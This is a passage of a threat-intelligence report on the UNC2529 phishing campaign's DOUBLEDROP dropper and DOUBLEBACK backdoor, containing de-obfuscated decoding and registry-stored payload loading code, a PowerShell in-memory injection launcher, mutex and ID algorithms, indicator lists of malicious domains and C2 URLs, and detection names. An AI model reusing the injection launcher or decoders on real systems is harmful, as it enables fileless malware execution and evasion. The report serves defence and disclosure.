  <span class="type-XS">Figure 7: De-obfuscated and sanitized bootstrap code</span></p>
 <p>Note that the actual values for <span
  class="code">&lt;base64_encoded_path_to_launcher&gt;</span>, <span
  class="code">&lt;launcher_reg_val&gt;</span>, and <span
  class="code">&lt;xor_val&gt;</span> are generated on the fly by the
  dropper and will be different across the compromised systems.</p>
 <p>The encoding of the launcher is implemented as a simple rolling XOR
  that is incremented after each iteration. The following code snippet
  (Figure 8) could be used to either encode or decode the launcher,
  given the initial key.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">def encdec(src, key):<br />      out =
          bytearray()<br />      for b in src:<br />          if key
          &gt;= 250:<br />              key = 0<br />         
          out.append(b ^ key)<br />          key += 4<br />      return
      out</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Algorithm to Decode the Launcher</span></p>
 <p>Once the launcher is decoded it is executed within the same
  PowerShell process as the bootstrap by calling the iex
  (Invoke-Expression) command.</p>
 <h5>Launcher</h5>
 <p>The launcher responsibility, after being executed by the bootstrap
  code, is to decrypt and execute the payload saved under the
  VersionIndependentProgID registry key. To do so, the launcher first
  decodes the RC4 key provided in the <span
  class="code">&lt;first_4_chars_of_rnd_guid_0&gt;</span> value (see
  Figure 5) and then uses it to decrypt the payload. Once the payload is
  decrypted, the launcher allocates virtual memory enough to house the
  image in memory, copies it there, and finally creates a thread around
  the entry point specified in the dropper. The function at that entry
  point is expected to lay the image in memory, to relocate the image,
  if necessary, to resolve the imports and finally—to execute the
  payload's entry point.</p>
 <p>A sanitized and somewhat de-obfuscated version of the launcher is
  shown in Figure 9.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">function DecryptPayload {<br />     
            param($fn7, $xf7, $mb5)<br />      $fn1 = Get-ItemProperty
            -Path $fn7 -n $mb5 | Select-Object -ExpandProperty
            $mb5;<br />      $en8 = ($fn1[32] + (19 + (((5 - 2) + 0) +
            11)));<br />      $ow7 = $fn1[$en8..($en8 + 31)];<br />     
            [array]::Reverse($ow7);<br />      $fn1 = Get-ItemProperty
            -Path $fn7 -n $xf7 | Select-Object -ExpandProperty
            $xf7;<br />      $en8 = {<br />          $xk2 =
            0..255;<br />          0..255 | % {<br />              $wn4
            = ($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length]) % (275 - (3 +
            (11 + 5)));<br />              $xk2[$_], $xk2[$wn4] =
            $xk2[$wn4], $xk2[$_]<br />          };<br />          $fn1 |
            % {<br />              $sp3 = ($sp3 + 1) % (275 - 19);<br />
                        $si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) -
            64);<br />              $xk2[$sp3], $xk2[$si9] = $xk2[$si9],
            $xk2[$sp3];<br />              $_-bxor$xk2[($xk2[$sp3] +
            $xk2[$si9]) % (343 - ((1 + 0) + 86))]<br />          }<br />
                };<br />      $ry6 = (&amp; $en8 | foreach-object {
            '{0:X2}' -f $_ }) -join '';<br />      ($(for ($sp3 = 0;
            $sp3 -lt $ry6.Length; $sp3 += 2) {<br />                 
            [convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 +
            0))))<br />              }<br />          )<br />     
            )<br />  }</span></p> <p>
          <span class="code">function ExecuteApi {<br />     
            param($fn7, $xf7)<br />      $vy9 =
            [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object
            System.Reflection.AssemblyName('?RND?')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?',
            $false).DefineType('?RND?',
            'Class,Public,Sealed,AnsiClass,AutoClass',
            [System.MulticastDelegate]);<br />     
            $vy9.DefineConstructor('RTSpecialName,HideBySig,Public',
            [System.Reflection.CallingConventions]::Standard,
            $fn7).SetImplementationFlags('Runtime,Managed');<br />     
            $vy9.DefineMethod('Invoke',
            'Public,HideBySig,NewSlot,Virtual', $xf7,
            $fn7).SetImplementationFlags('Runtime,Managed');<br />     
            $vy9.CreateType()<br />  }</span></p> <p>
          <span class="code">function GetProcAddress {<br />     
            param($fn7)<br />      $fq3 =
            ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object
            {<br />          $_.GlobalAssemblyCache -and
            $_.Location.Split('\\')[-1].Equals('System.dll')<br />     
            }).GetType('Microsoft.Win32.UnsafeNativeMethods');<br />   
              $lr3 = New-Object
            System.Runtime.InteropServices.HandleRef((New-Object
            IntPtr), ($fq3.GetMethod('GetModuleHandle').Invoke(0,
            @('kernel32.dll'))));<br />     
            $fq3.GetMethod('GetProcAddress', [reflection.bindingflags]
            'Public,Static', $null,
            [System.Reflection.CallingConventions]::Any, @((New-Object
            System.Runtime.InteropServices.HandleRef).GetType(),
            [string]), $null).Invoke($null,
            @([System.Runtime.InteropServices.HandleRef]$lr3,
            $fn7))<br />  }</span></p> <p>
          <span class="code">$decryptedPayload = DecryptPayload
            'hklm:\software\classes\CLSID\&lt;rnd_guid_0&gt;\VersionIndependentProgID'
            '&lt;reg_val_payload&gt;'
        '&lt;reg_val_rc4_key&gt;';</span></p> <p>
          <span class="code">function InjectPayload {<br />     
            param($payload, $payloadLen, $entryPoint, $access)<br />   
              $mem =
            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress
            'VirtualAllocEx'), (ExecuteApi @([IntPtr], [IntPtr],
            [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0,
            $payloadLen, 0x3000, $access);</span></p> <p>
          <span class="code">   
            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress
            'RtlMoveMemory'), (ExecuteApi @([IntPtr], [byte[]],
            [UInt32])([Intptr]))).invoke($mem, $payload,
            $payloadLen);<br />      $mem = New-Object System.Intptr
            -ArgumentList $($mem.ToInt64() + $entryPoint);</span></p> <p>
          <span class="code">   
            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress
            'CreateThread'), (ExecuteApi @([IntPtr], [UInt32], [IntPtr],
            [IntPtr], [UInt32], [IntPtr])([Intptr]))).invoke(0, 0, $mem,
            0, 0, 0);<br />      Start-Sleep -s (((2673 - 942) +
            1271))<br />  }</span></p> <p>
          <span class="code"># 0x36dc = Loader Entry Point, rva<br />  #
            0x40 = PAGE_EXECUTE_READWRITE<br />  InjectPayload
            $decryptedPayload $decryptedPayload.length 0x36dc
        0x40</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: De-obfuscated and sanitized launcher script</span></p>
 <h4>DOUBLEBACK Backdoor component</h4>
 <h5>Overview</h5>
 <p>The observed DOUBLEDROP instances contain a well-designed backdoor
  implemented as a 32 or 64-bit PE dynamic library which we track as
  DOUBLEBACK. The backdoor is initially mapped into the same PowerShell
  process started by the bootstrap script, but it will then inject
  itself into a msiexec.exe process if certain conditions are met. By
  design, the core of the backdoor functionality is intended to be
  executed after injected into a newly spawned msiexec.exe process. </p>
 <p>In contrast with other backdoors DOUBLEBACK does not have its
  services hardcoded and the functionality is expected to be implemented
  as plugins that are expected to be serialized in the registry database
  under a host-specific registry path. That way, the backdoor can be
  configured to implement a flexible set of services depending on the
  target. With all the common functionality implemented as plugins, the
  backdoor’s main goal is to establish a communication framework
  ensuring data integrity between the C2 server and the appropriate plugins.</p>
 <h5>Details</h5>
 <p>The backdoor starts by retrieving its process name and ensures that
  it is either powershell.exe or msiexec.exe. In all other cases, the
  malware will immediately terminate itself. Normally, when first
  started on the system, the backdoor will be injected into the same
  PowerShell process that executes both the bootstrap code and the
  launcher. In that mode the malware may spawn (depending on certain
  conditions) a msiexec process and injects itself into it. More details
  about the logic implemented in the PowerShell and the msiexec branches
  are provided in the following sections. </p>
 <p>Next, the backdoor ensures that it is the only DOUBLEBACK instance
  currently executing on the compromised system. To do that, the malware
  generates a host-based pseudo-unique GUID and uses it as a mutex name.
  The algorithm first generates a pseudo-unique host identifier that is
  based on the system volume's serial number and a hardcoded salt value,
  as shown in Figure 10.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code"># oberserved salt = 0x436ea76d<br />  def
          gen_host_id(vol_ser_num, salt):<br />      salted_val =
          (vol_ser_num + salt) &amp; 0xffffffff<br />      md5 =
          hashlib.md5(bytes(salted_val.to_bytes(4, 'little')))<br />   
            second_dword = struct.unpack('&lt;i',
          md5.digest()[4:8])[0]<br />      return (salted_val +
          second_dword) &amp; 0xffffffff</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 10: Host ID generation algorithm</span></p>
 <p>Next, the malware passes the generated host ID to another algorithm
  that generates a pseudo-unique GUID based on the input, as shown in
  Figure 11.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code"># src is the host ID<br />  def
          gen_guid(src):<br />      b = bytearray()<br />      xor =
          0xaabbccdd<br />      for _ in range(4):<br />          b +=
          src.to_bytes(4, byteorder='little')<br />          src ^=
          xor<br />          xor = (xor + xor) &amp; 0xffffffff<br />   
            return uuid.UUID(bytes_le=bytes(b))</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: GUID generation algorithm</span></p>
 <p>Once the GUID is generated the malware formats it as Global\{<span
  class="code">&lt;guid&gt;</span>} and attempts to open a mutex with
  that name. In case the mutex is already created the backdoor assumes
  that another instance of itself is already running and terminates
  itself. Otherwise, the backdoor creates the mutex and branches out
  depending on the detected process it currently mapped into.</p>
 <h4>Executing Within the PowerShell Process</h4>
 <p>The initial state of the backdoor execution is when it is mapped
  into a PowerShell process created by the bootstrap code. In this mode,
  the backdoor attempts to relocate itself into a new instance of
  msiexec.exe. Before the injection is attempted, the backdoor
  enumerates the running processes looking for Kaspersky Antivirus
  (avp.exe, avpui.exe) or BitDefender (bdagent.exe, bdservbdagent.exe,
  bdservicehost.exe) engines. This part of the functionality seems to be
  a work in progress because the malware ignores the fact if the
  Kaspersky software is detected but it will not attempt injecting into
  the msiexec.exe process in case BitDefender is found running on the
  compromised system. In the latter case, the backdoor's main
  functionality will be executed inside the same PowerShell process and
  no new instance of msiexec.exe will be created.</p>
 <p>The injection process involves finding the backdoor's image under
  the appropriate registry key. Note, that the backdoor instance we have
  observed in the first wave does not handle situations when the malware
  ecosystem is installed as an administrator—such cases would end up
  with the backdoor not able to locate its image for injecting. In all
  other cases, the malware starts with the well-known class GUIDs of the
  PlaySoundService and MsCtfMonitor classes and attempts to find which
  of them has the TreatAs registry key under their definition. Once the
  TreatAs key is found, its default registry value points to the
  registry key that has the RC4-encrypted backdoor image and the encoded
  RC4 key both described in the previous section of the post.</p>
 <p>With the backdoor image loaded in memory and decrypted, the malware
  spawns a suspended process around msiexec.exe and inject its image
  into it. The backdoor PE file exports a single function that is used
  to lay down its own image in memory and execute its DllMain entry
  point. The export function allocates the needed memory, relocates the
  image, if needed, resolves the imports and finally executes the
  backdoor’s DllMain function.</p>
 <p>At this point the backdoor is running inside the hijacked
  msiexec.exe and the instance inside the PowerShell process terminates itself.</p>
 <h4>Executing as Injected in the msiexec.exe Process</h4>
 <h5>Overview</h5>
 <p>The DOUBLEBACK backdoor executes its main functionality while
  injected in a dedicated msiexec.exe process (provided BitDefender AV
  is not found running on the system). The main logical modules of the
  backdoor are its configuration, plugin management, and communications.
  In the following sections we will describe the first two, while a
  future blog post will focus on the communications and the evolution of
  the backdoor.</p>
 <h5>Configuration</h5>
 <p>The backdoor uses an embedded configuration that contains the C2
  URLs and a key (more about the key in the second part of the post).
  The configuration data is formatted as shown in Figure 12.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">struct tag_config_header_t {<br />     
            uint32_t xor_val_1;<br />      uint32_t xor_val_2;<br />   
              uint32_t xor_val_3;<br />      uint32_t xor_val_4;<br />
            } config_header_t;</span></p> <p>
          <span class="code">struct tag_config_t {<br />     
            config_header_t header;<br />      uint8_t
            encoded_config[];<br />  } config_t;</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 12: Encoded configuration format</span></p>
 <p>The length of the encoded_config data is provided by the XOR-ing of
  the xor_val_1 and xor_val_2 fields of the config_header_t structure.
  The config_t.encoded_config blob can be decoded by XOR-ing the data
  with the config_header_t.xor_val_1.</p>
 <p>The decoded configuration data consists of a comma-separated list of
  URLs followed by a key that is used in the communication module. The
  first two bytes specify the lengths of the comma-separated URL list
  and the key, respectively. The URLs in the observed samples follow the
  pattern shown in Figure 13.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span
      class="code">https://&lt;server&gt;/admin&lt;n&gt;/client.php</span></td> </tr></tbody></table>
 <p>Figure 13: Observed C2 URL pattern</p>
 <p>The initial sample did not have any value for <span
  class="code">&lt;n&gt;</span> but the samples after that were observed
  to use <span class="code">&lt;n&gt;</span> equal to 4 or 5.</p>
 <h5>Plugin Management</h5>
 <p>The backdoor's core functionality is implemented via plugins
  designed as PE Windows dynamic libraries. The plugins, as with the
  other backdoor components, are also saved in the registry database
  under a host-specific registry key. The full path to the plugins
  location is formatted as HK[LM|CU]:\Software\Classes\CLSID\{<span
  class="code">&lt;plugins_home_guid&gt;</span>}, where <span
  class="code">&lt;plugins_home_guid&gt;</span> is generated by the GUID
  algorithm shown in Figure 11 with a host-specific value we call
  implant ID which is used not only to generate the path to the plugins
  but with the backdoor’s C2 communications and it is also passed as a
  parameter to each of the plugins during their initialization. The
  implant ID is generated by seeding the Linear Congruential Generator
  (LCG) algorithm, shown in Figure 14, with the host ID and the <span
  class="code">&lt;max_range&gt;</span> value is set to 0x54c5638. The
  value generated by the LCG is then added to 0x989680 and the result
  serves as the implant ID.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">def lcg(max_range):<br />      global
          seed<br />      if seed == 0:<br />          seed =
          get_RDTSC()<br />      n = (0x7fffffed * seed + 0x7fffffc3)
          &amp; 0xffffffff<br />      val = n % max_range<br />     
          seed = n<br />      return val</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 14: Linear Congruential Generator used by
    the backdoor</span></p>
 <p>The backdoor enumerates all the registry values under the plugins
  home location (the registry value names are insignificant) and expects
  each of the plugins to be formatted, as shown in Figure 15.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">struct tag_plugin_header_t {<br />     
            uint32_t xor_val;<br />      uint32_t param_2; the second
            parameter of the pfn_init<br />      uint32_t len_1;<br />
                uint32_t len_2;<br />      uint32_t pfn_init;<br />     
            uint32_t pfn_cleanup;<br />      uint32_t param_3; the third
            parameter of the pfn_init<br />      uint32_t unused;<br />
            } plugin_header_t;</span></p> <p>
          <span class="code">struct tag_plugin_t {<br />       
             plugin_header_t header;<br />         uint8_t
            encoded_plugin[];<br />  } plugin_t;</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 15: Encoded plugins format</span></p>
 <p>As shown in Figure 15, the plugin data starts with a 32-byte long
  header followed by the encoded plugin DLL. The plugin encoding is
  implemented as a combination of rolling DWORD/BYTE XOR with initial
  value specified by the plugin_header_t.xor_val value. The
  plugin_header_t.len_1 stores the number of DWORDS to be decoded with
  plugin_header_t.xor_val which is incremented by 4 after each
  iteration. The plugin_header_t.len_2 specifies the number of bytes to
  be decoded at the current position after the previous operation with
  the current value of the plugin_header_t.xor_val (only the least
  significant byte is taken). In this mode the plugin_header_t.xor_val
  value is incremented by one after each iteration.</p>
 <p>The plugins are expected to export at least two functions—one for
  initialization and another to clean up the resources before unloading.
  The initialization routine takes four parameters—two from the header
  and two calculated by the backdoor, as shown Figure 16.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">pfn_init(implant_id,
          plugin_header_t.param_2, plugin_header_t.param_3,
      p_plugin_image_in_memory)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 16: Plugins initialization routine prototype</span></p>
 <p>The current backdoor's implementation provides support for up to 32
  plugins with each of them mapped and initialized in the backdoor's
  process space.</p>
 <h5>Additional Notes</h5>
 <p>The first backdoor instance we observed back in December 2020 was a
  stable and well-written code, but it was clearly a work in progress.
  For example, the early instance of the malware spawns a thread to
  secure delete the DOUBLEDROP dropper from disk which indicates that an
  earlier variant of this malware launched a copy of the dropper from
  the file system. The dropper would save its current location on disk
  in the default registry value under the HK[LM|CU]:\Software\Classes
  key. The backdoor spawns a dedicated thread that retrieves the
  dropper’s path and then proceeds to overwrite the image on disk with
  0x00, 0xFF, and a randomly generated byte before deleting the dropper
  from the file system.</p>
 <p>Additionally, the early instance of the backdoor, as mentioned,
  would not handle the situations when an elevated PowerShell process is
  used. The dropper would use a scheduled task in that case with the
  relevant registry keys created under the HKLM hive but the backdoor
  does not support that case and will not be able to find its image
  under the specific key in order to inject itself into the msiexec.exe process.</p>
 <p>Finally, the backdoor would output debug information in a few cases
  using the OutputDebugString API. Interestingly, the format and the
  generation of the log message is the same as the one used in the <a
    href="https://github.com/DeadNumbers/Pegasus/blob/f83159ebcc2b2ba429b23805fdc66ab3eb2959f5/Pegasus/inc/dbg.c">publicly
    available PEGASUS code</a> (<a
    href="https://advantage.mandiant.com/reports/18-00012170">preliminary
    technical analysis: Pegasus Malware Source Code</a>). The PEGASUS
  backdoor is distributed with modules that allow it to manipulate files
  generated by common Russian payment processing software that is used
  to assess and process VAT refunds. When executed on a workstation
  running targeted software, the malware can attempt to add VAT to
  transactions that are normally exempt and directs associated tax
  refunds to attacker-controlled bank accounts.</p>
 <h4>Conclusion</h4>
 <p>Considerable resources were employed by UNC2529 to conduct their
  December phishing campaign. Almost 50 domains supported various phases
  of the effort, targets were researched, and a legitimate third-party
  domain was compromised. The threat actor made extensive use of
  obfuscation and fileless malware to complicate detection to deliver a
  well coded and extensible backdoor. UNC2529 is assessed as capable,
  professional and well resourced. The identified wide-ranging targets,
  across geography and industry suggests a financial crime motive.</p>
 <p>DOUBLEBACK appears to be an ongoing work in progress and Mandiant
  anticipates further actions by UNC2529 to compromise victims across
  all industries worldwide.</p>
 <h4>Technical Indicators</h4>
 <h5>DOUBLEDRAG / BIFF8</h5>
 <p>
  <i>Files</i></p>
 <table border="1" cellspacing="0" cellpadding="0" width="480"> <tbody>
    <tr>
      <td width="257" valign="top"><p>
          <b>MD5</b></p> </td> <td width="142" valign="top"><p>
          <b>Role</b></p> </td> <td width="81" valign="top"><p>
          <b>Wave</b></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>39fc804566d02c35f3f9d67be52bee0d</p> </td> <td
        width="142" valign="top"><p>DOUBLEDRAG</p> </td> <td width="81"
        valign="top"><p>1<sup>st</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>44f7af834ee7387ac5d99a676a03cfdd</p> </td> <td
        width="142" valign="top"><p>DOUBLEDRAG</p> </td> <td width="81"
        valign="top"><p>1<sup>st</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>4e5583e34ad54fa7d1617f400281ba56</p> </td> <td
        width="142" valign="top"><p>PDF Decoy</p> </td> <td width="81"
        valign="top"><p>1<sup>st</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>e80dc4c3e26deddcc44e66bb19b6fb58</p> </td> <td
        width="142" valign="top"><p>PDF Decoy</p> </td> <td width="81"
        valign="top"><p>1<sup>st</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>169c4d96138d3ff73097c2a9aab5b1c0</p> </td> <td
        width="142" valign="top"><p>Zip</p> </td> <td width="81"
        valign="top"><p>1<sup>st</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>e70502d020ba707095d46810fd32ee49<sup></sup></p>
      </td> <td width="142" valign="top"><p>Zip</p> </td> <td width="81"
        valign="top"><p>1<sup>st</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>62fb99dc271abc104504212157a4ba91</p> </td> <td
        width="142" valign="top"><p>Excel BIFF8 macro</p> </td> <td
        width="81" valign="top"><p>2<sup>nd</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>1d3fcb7808495bd403973a0472291da5</p> </td> <td
        width="142" valign="top"><p>PDF Decoy</p> </td> <td width="81"
        valign="top"><p>2<sup>nd</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>6a1da7ee620c638bd494f4e24f6f1ca9</p> </td> <td
        width="142" valign="top"><p>Zip</p> </td> <td width="81"
        valign="top"><p>2<sup>nd</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>a28236b43f014c15f7ad4c2b4daf1490<sup></sup></p>
      </td> <td width="257" valign="top"><p>Zip</p> </td> <td
        width="257" valign="top"><p>2<sup>nd</sup></p> </td> </tr>
    <tr>
      <td width="257"
        valign="top"><p>d594b3bce66b8b56881febd38aa075fb<sup></sup></p>
      </td> <td width="257" valign="top"><p>Zip</p> </td> <td
        width="257" valign="top"><p>2<sup>nd</sup></p> </td> </tr></tbody></table>
 <p>
  <i>Domains</i></p>
 <table border="1" cellspacing="0" cellpadding="0" width="480"> <tbody>
    <tr>
      <td width="227" valign="top"><p>
          <b>Dec. 2, 2020 Wave</b></p> </td> <td width="253" valign="top"><p>
          <b>Dec. 11 to 18, 2020 Wave</b></p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>adupla[.]net</p> </td> <td
        width="253" valign="top"><p>aibemarle[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>ceylonbungalows[.]net</p> </td>
        <td width="253" valign="top"><p>bestwalletforbitcoin[.]com</p>
      </td> </tr>
    <tr>
      <td width="227" valign="top"><p>chandol[.]com</p> </td> <td
        width="253" valign="top"><p>bitcoinsacks[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>closetdeal[.]com</p> </td> <td
        width="253" valign="top"><p>digitalagencyleeds[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>daldhillon[.]com</p> </td> <td
        width="253" valign="top"><p>erbilmarriott[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>desmoncreative[.]com</p> </td> <td
        width="253" valign="top"><p>ethernetpedia[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>farmpork[.]com</p> </td> <td
        width="253" valign="top"><p>fileamazon[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>gemralph[.]com</p> </td> <td
        width="253" valign="top"><p>gamesaccommodationscotland[.]com</p>
      </td> </tr>
    <tr>
      <td width="227" valign="top"><p>isjustlunch[.]com</p> </td> <td
        width="253" valign="top"><p>greathabibgroup[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>logicmyass[.]com</p> </td> <td
        width="253" valign="top"><p>infomarketx[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>lottoangels[.]com</p> </td> <td
        width="253" valign="top"><p>jagunconsult[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>mangoldsengers[.]com</p> </td> <td
        width="253" valign="top"><p>khodaycontrolsystem[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>oconeeveteransmemorial[.]com</p>
      </td> <td width="253" valign="top"><p>maninashop[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>scottishhandcraft[.]com</p> </td>
        <td width="253" valign="top"><p>onceprojects[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>seathisons[.]com</p> </td> <td
        width="253" valign="top"><p>simcardhosting[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>skysatcam[.]com</p> </td> <td
        width="253" valign="top"><p>stayzarentals[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>smartnhappy[.]com</p> </td> <td
        width="253" valign="top"><p>touristboardaccommodation[.]com</p>
      </td> </tr>
    <tr>
      <td width="227" valign="top"><p>stepearn[.]com</p> </td> <td
        width="253" valign="top"><p>towncentrehotel[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>sugarmummylove[.]com</p> </td> <td
        width="253" valign="top"><p>vacuumcleanerpartsstore[.]com</p>
      </td> </tr>
    <tr>
      <td width="227" valign="top"><p>techooze[.]com</p> </td> <td
        width="253" valign="top"><p>zmrtu[.]com</p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>tigertigerbeads[.]com</p> </td>
        <td width="253" valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>totallyhealth-wealth[.]com</p>
      </td> <td width="253" valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>towncenterhotel[.]com</p> </td>
        <td width="253" valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="227" valign="top"><p>uaeworkpermit[.]com</p> </td> <td
        width="253" valign="top"><p> </p> </td> </tr></tbody></table>
 <h5>DOUBLEDROP</h5>
 <p>
  <i>MD5</i></p>
 <ul> <li>4b32115487b4734f2723d461856af155</li>
  <li>9e3f7e6697843075de537a8ba83da541</li>
  <li>cc17e0a3a15da6a83b06b425ed79d84c</li> </ul>
 <p>
  <i>URLs</i></p>
 <ul> <li>hxxp://p-leh[.]com/update_java.dat</li>
  <li>hxxp://clanvisits[.]com/mini.dat</li>
  <li>hxxps://towncentrehotels[.]com/ps1.dat</li> </ul>
 <h5>DOUBLEBACK</h5>
 <p>
  <i>MD5</i></p>
 <ul> <li>1aeecb2827babb42468d8257aa6afdeb</li>
  <li>1bdf780ea6ff3abee41fe9f48d355592</li>
  <li>1f285e496096168fbed415e6496a172f</li>
  <li>6a3a0d3d239f04ffd0666b522b8fcbaa</li>
  <li>ce02ef6efe6171cd5d1b4477e40a3989</li>
  <li>fa9e686b811a1d921623947b8fd56337</li> </ul>
 <p>
  <i>URLs</i></p>
 <ul> <li>hxxps://klikbets[.]net/admin/client.php</li>
  <li>hxxps://lasartoria[.]net/admin/client.php</li>
  <li>hxxps://barrel1999[.]com/admin4/client.php</li>
  <li>hxxps://widestaticsinfo[.]com/admin4/client.php</li>
  <li>hxxps://secureinternet20[.]com/admin5/client.php</li>
  <li>hxxps://adsinfocoast[.]com/admin5/client.php</li> </ul>
 <h4>Detections</h4>
 <p>FireEye detects this activity across our platforms. The following
  contains specific detection names that provide an indicator of
  exploitation or post-exploitation activities we associate with UNC2529.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td><p>
          <b>Platforms</b></p> </td> <td><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td width="267" valign="top"><p>Network Security</p> <p>Email
        Security</p> <p>Detection On Demand</p> <p>Malware File
        Scanning</p> <p>Malware File Storage Scanning<u></u></p> </td>
        <td width="357" valign="top"><ul> <li>FEC_Trojan_JS_DOUBLEDRAG_1
          (static)</li> <li>FE_Trojan_JS_DOUBLEDRAG_1 (static)</li>
            <li>Downloader.DOUBLEDRAG (network)</li>
            <li>Downloader.JS.DOUBLEDRAG.MVX (dynamic)</li>
            <li>FE_Dropper_PS1_DOUBLEDROP_1 (static)</li>
            <li>FEC_Dropper_PS1_DOUBLEDROP_1 (static)</li>
            <li>Dropper.PS1.DOUBLEDROP.MVX (dynamic)</li>
            <li>FE_Backdoor_Win_DOUBLEBACK_1 (static)</li>
            <li>FE_Backdoor_Win_DOUBLEBACK_2 (static)</li>
            <li>FE_Backdoor_Win_DOUBLEBACK_3 (static)</li>
            <li>FE_Backdoor_Win_DOUBLEBACK_4 (static)</li>
            <li>Backdoor.Win.DOUBLEBACK (network)</li>
          <li>Malware.Binary.xls</li> </ul> </td> </tr>
    <tr>
      <td width="267" valign="top"><p>Endpoint Security</p> </td> <td
        width="357" valign="top"><p>
          <i>Real-Time (IOC)</i></p> <ul> <li>POWERSHELL ENCODED REMOTE
            DOWNLOAD (METHODOLOGY)</li> <li>SUSPICIOUS POWERSHELL USAGE
          (METHODOLOGY)</li> <li>MALICIOUS SCRIPT CONTENT A
          (METHODOLOGY)</li> <li>POWERSHELL INVOCATION FROM REGISTRY
            ARTIFACT (METHODOLOGY)</li> </ul> <p>
          <i>Malware Protection (AV/MG)</i></p> <ul>
          <li>Generic.mg.1aeecb2827babb42</li>
          <li>Generic.mg.1bdf780ea6ff3abe</li>
          <li>Generic.mg.1f285e496096168f</li>
          <li>Generic.mg.6a3a0d3d239f04ff</li>
          <li>Generic.mg.ce02ef6efe6171cd</li>
          <li>Generic.mg.fa9e686b811a1d92</li>
          <li>Trojan.JS.Agent.TZP</li> <li>Gen:Variant.Ulise.150277</li>
          <li>Gen:Variant.Ulise.150283</li>
          <li>Gen:Variant.Razy.799918</li> </ul> </td> </tr></tbody></table>
 <h4>UNC2529 MITRE ATT&amp;CK Mapping</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="311" valign="top"><p>
          <b>ATT&amp;CK Tactic Category</b></p> </td> <td width="313" valign="top"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Resource Development</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a
              href="https://attack.mitre.org/techniques/T1584">Compromise
            Infrastructure</a> (TT1584)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1587">Develop
            Capabilities</a> (T1587)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1587/003">Digital
                Certificates</a> (T1587.003)</li> </ul> </li> <li>
            <a href="https://attack.mitre.org/techniques/T1588">Obtain
            Capabilities</a> (T1588)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1588/004">Digital
                Certificates</a> (T1588.004)</li> </ul> </li> </ul>
      </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Initial Access</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a
